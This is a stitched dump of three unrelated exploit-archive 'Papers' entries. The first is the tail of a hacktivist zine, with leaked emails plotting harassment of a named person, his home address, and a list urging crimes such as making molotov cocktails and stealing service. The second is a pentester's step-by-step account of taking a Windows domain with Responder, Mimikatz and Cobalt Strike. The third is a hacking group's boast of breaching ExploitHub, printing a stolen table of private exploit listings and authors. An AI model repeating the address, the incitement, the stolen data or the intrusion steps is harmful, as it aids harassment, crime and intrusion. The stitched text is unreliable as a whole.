On Aug 29, 2005, at 10:46 AM, narc <narc@narc.com> wrote:

It was brought to my attention that a one Jeremy Hammond decided to use a server
at your place of business to openly express a vulnerability he was demo-ing in a
public Internet Relay Chat (IRC) channel. Due to recent encounters with this
young man, I have learned to question any motives of his to disclose this
information, and as such, decided to contact you. Also, as I was attempting to
locate you, I also uncovered that Jeremy has been using his email account for
personal business to talk on public boards (Indymedia.org, Chicagoactions.org
and HackThisSite.org came up as initial results).

Upon further analysis of the situation, I also noted that Jeremy is the
webmaster for Macspecialist.com. As someone who is a known computer criminal
(ProtestWarrior, CUGNet, Chicago2600.net, and others that wish not to be named
have all been illegally accessed by Jeremy Hammond), I question his motives as
webmaster and further express concern for Macspecialist as a whole.

Contained below is the IRC log of the events that transpired. Insurgency is
Jeremy. Server: irc.chicago2600.net Channel: #chicago2600

From narc <narc@narc.com> To: radicaledward@chicago2600.net
Sept 6: FBI here TODAY. 3:00 P.M. chi2600
narc, if you wanna come, gimme a ring at XXX-XXX-XXXX ext XXX
I'll get you directions here.

From: narc <narc@narc.com> To: bawls@chicago2600.net
Sept 14 Subject: Re: Guess who went to jail again...
I just sent a very misspelled note in broken english/french to Jeremy to find
out where the Hackbloc shindig is, with any luck he'll reply and I'll send the
info to Chicago Police Intelligence to have a little 'special' fun. I need to
pad the Indymedia comments later tonight.
- narc

From: narc <narc@narc.com> To: bawls@chicago2600.net
Aug 23 Subject: Re: Domain fyi
If its in the slush fund, buy the remaining domains, but I'd really pick up the
FreeJeremy.net .org .info and lock them out, and point them to fuckjeremy.com
and maybe grab the .net and .org 

If Jeremy doesn't update the whois information, the registar will pull the
domain and as it stands there is 247 links back on MSN and 42 on Yahoo.
Kinda hard to get your message out if your domain is gone, and all your other
marketable domains are owned by anonymous parties. 

Well, Saturday morning, after bailing from the post-meet breakfast at IHOP, I
did a quick drive-by of Casa-de-Anarchy.... About a block and a half east of
90/94 on the North side of thestreet.  As in the picture on his site, there's a
pair of satellite dishes hangning off the porch structure.

Maybe on my way to GenCon, I'll get some reconnaissance photos. Jeremy Hammond /
1908 South Canalport / Chicago, IL 60608 I'm sure we can think of something
appropriate to do with this data.

> * Give Security Office of Union Station issue of Chicago Reader
I was planning on doing that this week, the Amtrak police are pretty much the
defacto security there, something to the effect that the Chicago 2600 was
planning to meet there, but there is one bad apple hell bent on creating strife,
here is the Chicago Reader article, any additional questions I can't answer, you
can try the Chicago office of the FBI.

> * Contact ""ThePlanet.com"" Re: Whois information for FreeJermey.com
I already have a mail out to them, I will be mailing ICANN tonight to ""speed""
things up a little.


From: narc <narc> To: BAWLS@CHICAGO2600.NET
Aug 22 Subject: Re: :: A call for arms ::

Look, Narc makes a lot of valid points, but we're not talking about facts here,
were talking about the media. This is about image, presentability,
salesmanship...not reality. You need someone to sell them a better story, and a
fact based letter to the editor isn't going to do anything. We need a story, a
fable, something exciting, that doesn't make us look like the bad guy. Which is
going to be exceedingly difficult, because he's already had the story written
about him.

I would even consider making him an accomplice or confidant of Konopka. May not
be true, but we're trying to sell records here, not run a candy store.

[------------------------------------------------------------------------------]
[ dismantling the copyright industry ................ disrespectcopyrights.net ]
[------------------------------------------------------------------------------]

""Quantity and quality of P2P technologies are inversely proportional to the
numbers of lawsuits issued to stop P2P"" - 3rd Monty's Law 

We are proposing DisrespectCopyrights.net, a portal to information piracy. We
serve as a think tank to oppose and subvert the copyright industry, while
encouraging independent media and file sharing alternatives to commercial
internet. 

* file archives - a collection of independent do-it-yourself materials including
activism, anarchism, anti-copyright, code, hts, images, legal, mp3, propaganda,
and zines. also allows people to upload their own files.
* news feeds - from various sources including the eff, p2pnet, slyck,
respectp2p, etc.
* wiki - all pages modifiable

We are also looking for flash designers to parody the content available on the
official MPAA site RespectCopyrights.org, twisting their language and imagery to
encourage piracy.

BECOME A TRAFFICKER OF ILLEGAL INFORMATION
or: HOW I LEARNED TO STOP WORRYING AND
LOVE DISMANTLING THE COPYRIGHT INDUSTRY

* support file sharing services by setting up torrent trackers and seeding,
files, starting ftp/irc drops, and running tor servers on high bandwidth
connections
* start a radical video collection and burn copies to vcds and dvds to hand out
for free at shows, schools, or with other radical literature
* make your own media and release it for free using a Creative Commons license
* bastardize corporate imagery, print out stickers and large posters to cover
the city
* embrace open publishing systems such as indymedia, wiki, etc
* support the ACLU, the EFF, and other civil liberties / digital rights groups.

Imagine organizing a pirate parade with costumes flags and instruments while at
the same time holding an anti-copyright protest with a bunch of hackers handing
out free software. This street action is one of many possible scenarios for
upcoming conventions like HOPE. The possibilities are endless.

                             !!!!!!!!!!!!!!!!!!!!!!!!
                             !!!  HACK THIS ZINE  !!!
                             !!!   SPRING 2006    !!!   
                             !!!!!!!!!!!!!!!!!!!!!!!!

We are an independent collective of creative hackers, crackers, artists and
anarchists. We gather to discuss and teach each other through vulnerability
research and code auditing, practical anarchy and organizing for national
conventions and protests.  Join us to explore positive hacktivism to help defend
a free internet and a free society.

                            THE INTERNET IS THE STAGE
                                WE ARE THE ACTORS

                                 Jeremy Hammond
                               whooka at gmail.com

ZINE STAFF
DarkAngel, OutThere, Kuroishi, br0kenkeychain, truth, nomenumbra, C

HACK THIS SITE
IceShaman, html, buz, Custodis, OutThere, archaios, Mcaster, ScriptBlue,
TechnoGuyRob, scenestar

HACKTIVIST / HACKBLOC
flatline, alxclada, DarkAngel, Ardeo, Kuroishi, Thetan, wyrmkill, Truth,
EvilDeshi, ScriptBlue

OTHER HELPERS
bfamredux, Phate, LeaChim, skopii, s1d, tgo, Hawk, ikari, Random Cola, genome,
EvilDeshi/WickedRadio, darwin, DarKry, C, Weiznit

THIS GOES OUT TO 
those who are brave enough to confront and fight racists, homphobes, religious
fundamentalists, right-wing extremists and other fascists in the street, those
who do emergency fundraising, media work, and drive hundreds of miles to bail us
out of prison, my partner in crime fetus who through our love commited countless
beautifully crazy actions I dare not speak of, the cool people at chicago2600
who don't put up with the bullshit from the white hats feds and narcs, the
militant anti-capitalists at midwest unrest and prole.info, the magical people
who go to the rainbow gatherings, moon festivals, burning man and other
gatherings of free minded people, those who are brave and willing to risk
everything to take direct action in defense of mother earth and it's creatures.

the crazy hackers at anomalous security, pulltheplug, the #phrack efnet crew,
electronic souls, el8 / h0no, rant media, x10, dikline, we are all brothers and
sisters working together to dismantle the white hat security industry who would
given the chance would sell us all out.

                                  GET INVOLVED 
                                   ON THE WWW
              hackthissite.org * hacktivist.net * hackbloc.org
         rootthisbox.org * disrespectcopyrights.net * wickedradio.org
            indymedia.org * infoshop.org * crimethinc.com/net/org

                                  MAKE CONTACT
     irc.hackthissite.org SSL port 7000 #hackthissite  #hacktivist.net #help
               visit our online forums at criticalsecurity.net

                         email us at htsdevs@gmail.com


                         !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                         !!!       HAPPENINGS       !!!
                         !!!  GET YOUR HACKBLOC ON  !!!
                         !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                             
                NATIONAL CONFERENCE ON ORGANIZED RESISTANCE(NCOR)
              STATE OF THE UNION PROTESTS / WASHINGTON DC, FEB 3-5

                          BAY AREA ANARCHIST BOOKFAIR
                           MARCH 19 ANTIWAR PROTESTS
                      SAN FRANCISCO / BERKELEY LATE MARCH

                   BIODEMOCRACY ACTIONS / CHICAGO APRIL 9-12

                         HACKERS ON PLANET EARTH / 2600
                           NEW YORK CITY, JULY 21-23

           PIRATE PARADES, STREET PARTIES, ANTI-COPYRIGHT PROTESTS
            FREE SOFTWARE GIVAWAYS - HACKERS TAKE TO THE STREETS!

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
build a cantenna and steal wireless internet access * announce phony mayor
resignations * give people discounts on phone gas internet or other utilities *
start a pirate radio station * give away free phone cards and get away with it *
never talk to the police, refuse to give statements or testimony, and support
political prisoners * op everyone in an irc channel * reprint, reword, and reuse
copyrighted material * go to school or work wearing bathrobes, skirts, and
pirate costumes * shut down major intersections in the business district * make
copies of radical videos and give them away for free * spew confusion at normals
* send fake emails as the boss and announce raises for everybody * hold street
parties to celebrate the wonderful possibilities of life * start a local ""write
on everything day"" * plant political propaganda in elementary schools * seed
torrent files * squat abandoned buildings and hold underground parties * steal
from the rich and give to the poor * arm philosophers and the homeless * take
over major media outlets and broadcast subversive messages * develop file
sharing services and non-commercial internet * hold acid tests and invite the
neighbors * start underground guerrilla public drum and dance brigades *
confront racists, homophobes, right-wingers and other bigots on the street *
produce your own music, zines, and clothing * sniff corporate traffic and create
scandals * deface billboards with anti-capitalist messages * fill your head with
heinous chemicals and talk to strangers on the train. donÕt tell them what your
on * pass out maps to rich peopleÕs addresses to the homeless * defeat
self-checkout services * syphon gasoline, dumpster some bottles, and learn to
make molotov cocktails * program a free open source alternative to a commercial
software application * convert your car to use bio-diesel * start wildcat
strikes and storm executive offices * make stencils, large posters + wheatpaste
and hit the streets * social engineer some food and give it out to people on the
street * crash political party conventions * refuse to get a credit card or
other bank account * ride your bike in the fast lane * organize a school walkout
* hook people up with free cable * learn to pick locks and how to break out of
handcuffs * destroy white hats, feds and narcs * never ask permission, and donÕt
apologize *  hack the recording industry and use their servers to seed torrents
to share commercial music, videos and software * organize a pirate parade and
give out copies of linux * start a hacker class war
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
Papers,A day in the life of a pentester: How I owned your domain in 4 hours,Multiple,,2016-09-15,: ,"## A day in the life of a pentester: How I owned your domain in 4 hours 

Arrived onsite, sat down, plugged in.

Started **Responder** (https://github.com/SpiderLabs/Responder), start **nbtscan**ning /24

- **Responder**: Spoofs **NBTNS** and **LLMNR** responses, get **NetNTLMv2** hashed passwords for domain users back in response
- **nbtscan** - Uses **NetBIOS** to get computer names/IPs from almost every host on subnet, very very quickly

> **Why**: The first step is to start gathering information about the environment. Most monitoring solutions will not detect nbtscan activity, and Responder is an easy win if their password policy is poor.

- - - 

Cracked some creds gathered from Responder, and used **Metasploit’s smb_login** to check across subnet for local administrator.

> Why: Slow checking of valid credentials (one attempt every 30 seconds or so) with smb_login will show systems where the compromised credentials allow _Local Adminstrator access.

- - - 
 
A couple systems had local admin from those creds, used local admin access to **psexec (executes a command or spawns a service, requires local admin or access to ADMIN$ share in Windows), spawn Cobalt Strike Beacons on those hosts.

- **Cobalt Strike** is an advanced red team framework, uses an implant called Beacon to control hosts.
- **Beacon** can communicate over **DNS**, **HTTPS**, **HTTP**, or **SMB**. In this case, I used HTTPS beacons. Additionally, we created a custom profile that makes Beacon traffic look like normal web browsing using the **Malleable C2** feature of Beacon. Raphael Mudge created Cobalt Strike, and has several examples of custom Beacon C2 profiles on his GitHub (https://github.com/rsmudge/Malleable-C2-Profiles)

> Why: I used this engagement to test out features of Cobalt Strike against a reasonably monitored network (I knew that the network is monitored, so I wanted to see how effective Cobalt Strike was for hiding my activity).

- - -

Use Beacons to run **Mimikatz** (integrated in Beacon), get plaintext credentials for users that have logged into the system recently. No domain admins yet.

- Mimikatz is a tool for attacking Windows secrets. Allows you to dump Kerberos secrets, create Golden Tickets, view plaintext credentials (if wdigest is enabled).

- - -

Ran BloodHound (https://github.com/adaptivethreat/BloodHound) to analyze Active Directory trust relationships, and find a path to the Domain Admins group. Showed several other systems across the domain that I could psexec to with the credentials I had.
Used Beacon’s SMB linking to spawn new Beacons to those systems, dumping cleartext credentials with Mimikatz on each of them. Only one compromised host actually talked to the internet, the rest just communicated through that single Beacon.

> Why: The fewer hosts sending odd traffic to the internet, the less suspicious you will be. Linking Beacons internally allowed me to control multiple hosts without having a system talking to the internet in an unusual manner.

**EXAMPLE** Beacon linked architecture:

```
                                              <---SMB---> Host 2 (SMB Beacon)
                                            /
C2 Server <---HTTPS---> Host 1 (HTTPS Beacon)<---SMB---> Host 3 (SMB Beacon)
                                            \
                                              <---SMB---> Host 4 (SMB Beacon)
```

One of those systems had cached credentials for a domain administrator. Used that to authenticate to Domain Controller, psexec to add Beacon link to DC, dumped hashes for entire domain.

- - - 

**NEXT STEPS**: Time to hunt for valuable data! The pentest is not over when you get Domain Admin, you want to show the ramifications of compromising a Domain Admin, and find how to best demonstrate that to the customer."
Papers,Inj3ct0r Team has hacked ExploitHub.com,eZine,,2012-12-11,: ,"###
# Title  : Inj3ct0r Team has hacked ExploitHub.com
# Inj3ct0r-zine : http://priv8.1337day.com/exploitHUB.txt
# Proof: http://priv8.1337day.com/proof_exploit_list.sql
# Home   : 1337Day Exploits Market
# Web    : 1337day.com .net .org
# Fb     : http://fb.me/inj3ct0rs
# Tw     : https://twitter.com/inj3ct0r

# <3 <3 Greetings t0 Inj3ct0r Members <3 <3
# Greetings To r4dc0re, Kingcope, CrosS, SeeMe, KedAns-Dz, DaOne, NuxbieCyber, Tibit, Sammy FORGIT, D4NB4R, neutr0n, D4RK CR1PT3R, Mark (Mko)! Angel Injection you chicken :P
# F-ck HaCking ExploitHub, Lov3 Explo8ting!

                       .-""``""-.
                      /______; \
                     {_______}\|
                     (/ a a \)(_)
                     (.-.).-.)
        _______ooo__(    ^    )____________
       /             '-.___.-'             \
      | Inj3ct0r Team hacked ExploitHub.com |
      |   1337Day w0rms member the best     |
      |     1337day.com  / inj3ct0rs.com    |
      |      1337day.net \  1337day.org     |
      \________________________ooo________/
                     |_  |  _|
                     \___|___/
                     {___|___}
                      |_ | _|
                      /-'Y'-\
                     (__/ \__)

What's new ?
*-...________________...-*

Today (December 11th), the Inj3ct0r Team has hacked http://exploithub.com and we like to add a small line here "" This is for Educational Purpose Only ""
Inj3ct0r Team stole private exploits worth $242333 (i ll calculate) from Exploithub


                                                       Z Where to sell my 0day exploits..
                                                   Z
                                   .,.,        z
                       ((((())    z
                               ((('_  _`) '
    _______________________    ((G   \ |)      ___________________
                              (((`   "" ,
                               .((\.:~:          .--------------.
   Do you want to buy       __.| `""'.__      | \              |
                            .''   `---'   `.    |  .             :
        or sell            /                `   |   `-.__________)
                          |             ~       |  :             :
       exploits?          |                     |  :  |
                          |    _                |     |   [ ##   
     1337day.com           \    `--.        ____|  ,   oo_______.'
                           `_   ( \) _____/     `--___
         is                 | `--)  ) `-.   `---   ( - a:f -
                            |   '///`  | `-.
    a good solution         |     | |  |    `-.
                            |     | |  |       `-.
                            |     | |\ |
                            |     | | \|
                             `-.  | |  |
                                `-| '

-----------------------Reason-------------------------------------------

We hacked http://exploithub.com because the people who publish private exploits on http://exploithub.com 
need know that the ExploitHub Admins are lamers and can not provide them with adequate security.



Where   _     ,,,,
 Proof?   \   /   '
             /.. /
            ( c  D
             \- '\_
              `-'\)\
                 |_ \
                 |U \\
                (__,//
                |. \/
                LL__I
                 |||
                 |||
              ,,-``'\


I show a piece of the database:


""product_name"",	""product_price"",   ""created_date"",   ""author_id"",  ""author_username""


CA Total Defense Suite deleteReportFilter Stored Procedure SQL Injection,100.0000,2012-01-02 14:45:13,""60"",Mario
Novell iPrint Client ActiveX Control debug Buffer Overflow,50.0000,2012-01-02 14:45:43,""60"",Mario
Trend Micro Internet Security Pro 2010 ActiveX Control Buffer Overflow,50.0000,2012-01-02 14:46:06,""60"",Mario
Oracle ABORT_TABLE_INSTANTIATION Buffer Overflow,1000.0000,2011-03-18 16:30:27,""60"",Mario
Oracle CREATE_DATABASE_LINK Buffer Overflow,1100.0000,2011-03-18 16:32:00,""60"",Mario
Oracle DELETE_REFRESH_OPERATIONS Buffer Overflow,1000.0000,2011-03-18 16:32:48,""60"",Mario
Oracle DIFFERENCES Buffer Overflow,1000.0000,2011-03-18 16:33:52,""60"",Mario
Oracle DISABLE_RECEIVER_TRACE Buffer Overflow,1000.0000,2011-03-18 16:35:10,""60"",Mario
Oracle FROM_TZ() Buffer Overflow,1000.0000,2011-03-18 16:36:02,""60"",Mario
Oracle GENERATESCHEMA Buffer Overflow.,1500.0000,2011-03-22 21:01:02,""60"",Mario
Oracle GET_FULL_FILENAME Buffer Overflow.,1000.0000,2011-03-22 20:57:40,""60"",Mario
Oracle9i INSTANTIATE_OFFLINE Buffer Overflow,1000.0000,2011-03-18 16:39:18,""60"",Mario
Oracle9i KSDWRT Buffer Overflow,1000.0000,2011-03-18 16:39:57,""60"",Mario
Oracle NUMTODSINTERVAL() Buffer Overflow.,1500.0000,2011-03-22 21:03:58,""60"",Mario
Oracle NUMTOYMINTERVAL() Buffer Overflow,1000.0000,2011-03-18 16:41:57,""60"",Mario
Oracle PARALLEL_PUSH_RECOVERY Buffer Overflow,1000.0000,2011-03-18 16:42:39,""60"",Mario
Oracle10g PITRIG_DROP Buffer Overflow,1000.0000,2011-03-18 16:43:36,""60"",Mario
Oracle10g PITRIG_DROPMETADATA Buffer Overflow,1200.0000,2011-03-18 16:44:16,""60"",Mario
Oracle10g PITRIG_TRUNCATE Buffer Overflow,1000.0000,2011-03-18 16:44:58,""60"",Mario
Oracle SYS.LTUTIL Buffer Overflow,1200.0000,2011-03-18 16:45:55,""60"",Mario
Oracle9i REGISTER_USER_REPGROUP Buffer Overflow,1000.0000,2011-03-18 16:47:21,""60"",Mario
Oracle SDO_CODE_SIZE Buffer Overflow,1000.0000,2011-03-18 16:48:09,""60"",Mario
Oracle SET TIME_ZONE Buffer Overflow,1000.0000,2011-03-18 16:48:54,""60"",Mario
Oracle CTX_OUTPUT() Buffer Overflow,1000.0000,2011-03-18 16:49:51,""60"",Mario
Oracle TO_TIMESTAMP_TZ() Buffer Overflow,1000.0000,2011-03-18 16:50:28,""60"",Mario
Oracle TZ_OFFSET() Buffer Overflow,1000.0000,2011-03-18 16:51:11,""60"",Mario
Oracle DBMS_AQADM Buffer Overflow,1000.0000,2011-03-18 16:52:03,""60"",Mario
DBMS_JVM_EXP_PERMS Escalation,500.0000,2011-03-18 16:53:19,""60"",Mario
Oracle extjob.exe Command Execution Vulnerability,200.0000,2011-10-06 10:42:28,""60"",Mario
CTXSYS.DRILOAD SQL Injection,125.0000,2011-01-26 15:37:30,""60"",Mario
SET_OUTPUT_TO_JAVA SQL Injection,1000.0000,2011-03-18 16:55:44,""60"",Mario
Symantec Alert Management System ModemString Buffer Overflow,200.0000,2012-06-14 11:39:16,""60"",Mario
Symantec Alert Management System PinNumber Buffer Overflow,200.0000,2011-11-27 14:41:35,""60"",Mario
KingView 6.53 SCADA HMI HistorySvr Heap Overflow,250.0000,2011-03-23 13:31:14,""84"",Ian
IGSS IGSSdataServer.exe opcode 0xd overflow,500.0000,2011-06-15 10:55:12,""89"",hal
Opera Browser 10.62 border-radius (SVG handler) Memory Corruption,100.0000,2011-06-17 08:51:49,""184"",Ss3c
FactoryLink vrn.exe opcode 9 overflow,500.0000,2011-06-15 10:55:23,""89"",hal
Lotus Domino iCalendar Stack Overflow,1500.0000,2011-06-14 15:43:49,""209"",jgrusko
IBM Lotus Domino 8.5.2 WebAdmin.nsf Cross-Site Scripting Vulnerability,0.0000,2011-07-10 05:59:42,""126"",r0i
Site License,0.0000,2011-07-20 02:29:53,"""",
Adobe Flash Player newfunction rop 2,200.0000,2011-07-30 15:43:45,""62"",NSSLabs
Adobe Flash Player newfunction rop 3,200.0000,2011-07-30 15:43:23,""62"",NSSLabs
Adobe Flash Player newfunction rop 4,200.0000,2011-07-30 15:44:57,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_1,250.0000,2011-07-30 15:59:44,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_2,250.0000,2011-07-30 16:00:52,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_3,250.0000,2011-07-30 16:03:21,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_4,250.0000,2011-07-30 16:02:59,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_5,250.0000,2011-07-30 16:04:04,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_6,250.0000,2011-07-30 16:04:50,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_7,250.0000,2011-07-30 16:06:55,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_8,250.0000,2011-07-30 16:08:37,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_9,250.0000,2011-07-30 16:09:20,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_10,250.0000,2011-07-30 16:10:06,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_11,250.0000,2011-07-30 16:10:54,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_12,250.0000,2011-07-30 16:11:44,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_13,250.0000,2011-07-30 16:12:31,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_14,250.0000,2011-07-30 16:13:22,""62"",NSSLabs
ms11_003_ie_css_import_stackpivot_rop_15,250.0000,2011-07-30 16:14:04,""62"",NSSLabs
Adobe Flash Player newfunction rop 1,200.0000,2011-08-01 15:24:09,""62"",NSSLabs
Adobe CoolType SING Table winxp rop 1,250.0000,2011-08-01 18:13:29,""62"",NSSLabs
Adobe CoolType SING Table win7 rop 1,250.0000,2011-08-01 18:16:19,""62"",NSSLabs
Citrix Systems Provisioning Services 5.6 Buffer Overflow Module,300.0000,2011-08-01 18:18:19,""62"",NSSLabs
Avaya WinPMD UniteHostRouter Buffer Overflow,200.0000,2011-08-07 09:42:10,""60"",Mario
Oracle TO_CHAR() Buffer Overflow.,1000.0000,2011-08-08 14:55:39,""60"",Mario
Oracle DBMS_JAVA_TEST Buffer Overflow.,1000.0000,2011-08-08 15:08:45,""60"",Mario
Oracle Database and Enterprise Manager Grid Control Remote Code Execution,500.0000,2011-08-14 16:26:04,""60"",Mario
Oracle Outside In CDR Buffer Overflow,200.0000,2011-08-13 18:27:08,""60"",Mario
Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability,500.0000,2011-08-14 16:29:35,""60"",Mario
Firefox sensor.dll Insecure Library Loading,100.0000,2011-12-10 13:50:42,""60"",Mario
IBM Lotus Forms Viewer Insecure Library Loading,100.0000,2012-07-20 21:15:05,""60"",Mario
Wireshark Insecure Script Loading,50.0000,2012-01-02 14:51:16,""60"",Mario
PcVue v5.52 (SVUIGrd.ocx) ActiveX Control Remote Code Execution,500.0000,2011-10-04 00:45:50,""288"",^rwX
DATAC RealWin SCADA Server On_FC_BINFILE_FCS_FILE (0a) Buffer Overflow,100.0000,2011-10-06 00:57:57,""60"",Mario
DATAC RealWin SCADA Server On_FC_CGETTAG_FCS_GETTELEMETRY Buffer Overflow,100.0000,2011-10-06 14:42:46,""60"",Mario
DATAC RealWin SCADA Server On_FC_CGETTAG_FCS_SETTELEMETRY Buffer Overflow,100.0000,2011-10-06 14:45:22,""60"",Mario
DATAC RealWin SCADA Server On_FC_SCRIPT_FCS_STARTPROG Buffer Overflow,100.0000,2011-10-06 14:46:42,""60"",Mario
DATAC RealWin SCADA Server On_FC_CGETTAG_FCS_SETCHANNELTELEMETRY Buffer Overflow,100.0000,2011-10-06 14:55:38,""60"",Mario
DATAC RealWin SCADA Server On_FC_CGETTAG_FCS_GETCHANNELTELEMETRY Buffer Overflow,100.0000,2011-10-06 15:03:19,""60"",Mario
Tunnelblick (Mac OS X third-party software) Privilege Escalation,300.0000,2011-10-06 16:35:13,""238"",subreption
OpenVPN Trusted Path Privilege Escalation,50.0000,2011-10-07 16:52:01,""60"",Mario
ACDSee FotoSlate Int Buffer Overflow,100.0000,2011-10-10 16:57:47,""60"",Mario
Safari SVGPathSegList Use-After-Free,500.0000,2012-08-10 14:57:52,""200"",dput
IBM Lotus Domino Web Server If-Modified-Since Remote Buffer Overflow,100.0000,2011-10-11 01:14:32,""60"",Mario
DATAC RealWin FCS_ADDTAGMS Buffer Overflow,100.0000,2011-10-12 20:02:43,""280"",James
DATAC RealWin FCS_CADDTAG Buffer Overflow,100.0000,2011-10-12 20:04:53,""280"",James
DATAC RealWin FCS_CDELTAG Buffer Overflow,100.0000,2011-10-12 20:06:31,""280"",James
DATAC RealWin On_FC_BINFILE_FCS_FILE_D Buffer Overflow DEP Bypass,150.0000,2011-10-12 20:08:35,""280"",James
DATAC RealWin On_FC_BINFILE_FCS_FILE_B Buffer Overflow,100.0000,2011-10-12 20:10:58,""280"",James
DATAC RealWin On_FC_BINFILE_FCS_FILE_C Buffer Overflow,100.0000,2011-10-12 20:12:16,""280"",James
DATAC RealWin On_FC_BINFILE_FCS_FILE_E Buffer Overflow,100.0000,2011-10-12 20:13:47,""280"",James
DATAC RealWin On_FC_BINFILE_FCS_FILE_F Buffer Overflow,100.0000,2011-10-12 20:15:00,""280"",James
HP iNode Management Center iNodeMngChecker Buffer Overflow,100.0000,2011-10-17 11:59:20,""60"",Mario
Microsoft Office Uninitialized Object Pointer Vulnerability,250.0000,2012-11-01 04:03:46,""354"",xBoy
ACDSee XBM Variable Name Buffer Overflow,50.0000,2012-04-14 11:31:11,""60"",Mario
Cytel Studio LogXact USE Buffer Overflow,50.0000,2011-11-03 20:49:38,""60"",Mario
EMC Autostart Domain Name Logging Buffer Overflow,100.0000,2011-12-05 07:11:26,""60"",Mario
Oracle SDO_CS.TRANSFORM_LAYER Buffer Overflow,500.0000,2011-12-13 19:29:17,""60"",Mario
Oracle DBLINK_INFO Buffer Overflow.,400.0000,2011-12-13 20:25:48,""60"",Mario
Oracle DBMS_AQJMS_INTERNAL.AQ$_REGISTER Buffer Overflow,300.0000,2011-12-13 23:12:53,""60"",Mario
Oracle DBMS_AQJMS_INTERNAL.AQ$_UNREGISTER Buffer Overflow,300.0000,2011-12-13 23:15:24,""60"",Mario
DameWare Mini Remote Control NTLMSSP Buffer Overflow,100.0000,2011-12-14 23:33:58,""60"",Mario
DameWare Mini Remote Control USERNAME Buffer Overflow,100.0000,2011-12-14 23:35:49,""60"",Mario
eSignal WinSig.exe long StyleTemplate Buffer Overflow,100.0000,2011-12-19 23:11:21,""60"",Mario
NetDecision TFTP Server Directory Traversal,50.0000,2011-12-21 23:52:31,""60"",Mario
CA Total Defense Suite UNC Management Console deleteReportTemplate Store d Procedure SQL Injection,100.0000,2011-12-22 00:57:42,""60"",Mario
Sunway Force Control <= 6.1 httpsvr.exe,100.0000,2011-12-24 02:11:26,""280"",James
HP Managed Printing Admistration jobAcct Arbitrary File Creation,25.0000,2011-12-24 16:31:21,""60"",Mario
HP Managed Printing Admistration jobDelivery Arbitrary File Creation,25.0000,2011-12-24 16:33:05,""60"",Mario
FreeBSD telnetd Buffer Overflow,75.0000,2011-12-28 00:37:45,""60"",Mario
ESTsoft ALZip MIM File Buffer Overflow,100.0000,2011-12-28 21:49:06,""280"",James
Novell iPrint Client ActiveX Control GetDriverFile Buffer Overflow,100.0000,2011-12-29 00:12:11,""60"",Mario
Novell iPrint Client ActiveX Control GetDriverSettings Buffer Overflow,100.0000,2011-12-29 23:08:59,""60"",Mario
HastyMail rsargs[] Arbitrary Command Injection,100.0000,2012-01-02 18:01:39,""60"",Mario
Trend Micro InterScan Web Security Suite Local Privilege Escalation,50.0000,2012-01-06 15:09:35,""60"",Mario
Citrix Provisioning Services streamprocess.exe 0x40020000 Buffer Overflow,100.0000,2012-03-27 20:39:42,""60"",Mario
Citrix Provisioning Services streamprocess.exe 0x40020002 Buffer Overflow,100.0000,2012-03-27 20:40:18,""60"",Mario
Citrix Provisioning Services streamprocess.exe 0x40020004 Buffer Overflow,100.0000,2012-03-27 20:40:43,""60"",Mario
Citrix Provisioning Services streamprocess.exe 0x40020006 Buffer Overflow,100.0000,2012-03-27 20:41:01,""60"",Mario
SolarWinds Storage Manager Server SQL Injection Authentication Bypass And Command Execution,100.0000,2012-03-27 20:41:25,""60"",Mario
Sunway Forcecontrol <= 6.1 sp3 SNMP NetDBServer.exe,100.0000,2012-01-30 17:04:26,""280"",James
Motorola Netopia netOctopus SDCS Buffer Overflow,100.0000,2012-03-27 20:41:46,""60"",Mario
CA Total Defense Suite deleteReportFilter Stored Procedure SQL Injection,100.0000,2012-04-17 17:30:46,""60"",Mario
Exploit-builder for CVE-2011-0611,500.0000,2012-03-15 15:11:07,""417"",Excoriot
Cisco VPN Client Arbitrary Command Injection,50.0000,2012-02-29 20:24:56,""60"",Mario
TheGreenBow IPSec VPN Client Arbitrary Command Injection,50.0000,2012-03-01 15:12:26,""60"",Mario
Trend Micro ServerProtect 5.58 CMON_ActiveRollback Buffer Overflow,100.0000,2012-03-06 15:47:47,""60"",Mario
Trend Micro ServerProtect 5.58 CMON_ActiveUpdate Buffer Overflow,100.0000,2012-03-06 15:48:59,""60"",Mario
Trend Micro ServerProtect 5.58 SetSvcImpersonateUser Buffer Overflow,100.0000,2012-03-06 16:17:54,""60"",Mario
Trend Micro ServerProtect 5.58 RPCFN_ENG_AddTaskExportLogItem Buffer Overflow,100.0000,2012-03-06 19:46:03,""60"",Mario
Trend Micro ServerProtect 5.58 SetPagerNotifyConfig Buffer Overflow,100.0000,2012-03-06 19:45:29,""60"",Mario
Trend Micro ServerProtect 5.58 ENG_SENDMAIL Buffer Overflow,100.0000,2012-03-06 20:52:24,""60"",Mario
Trend Micro ServerProtect 5.58 CMON_NetTestConnection Buffer Overflow,100.0000,2012-03-07 14:01:24,""60"",Mario
Computer Associates Alert Notification 0x15 Buffer Overflow,100.0000,2012-03-08 16:57:25,""60"",Mario
Computer Associates Alert Notification 0x17 Buffer Overflow,100.0000,2012-03-08 16:58:50,""60"",Mario
NETGEAR SafeNet SoftRemote IKE Service Buffer Overflow,100.0000,2012-03-10 14:57:36,""60"",Mario
freeSSHD 1.2.1 FXP_OPENDIR Buffer Overflow,100.0000,2012-03-12 14:13:19,""60"",Mario
freeSSHD 1.2.1 FXP_RENAME Buffer Overflow,100.0000,2012-03-12 14:14:32,""60"",Mario
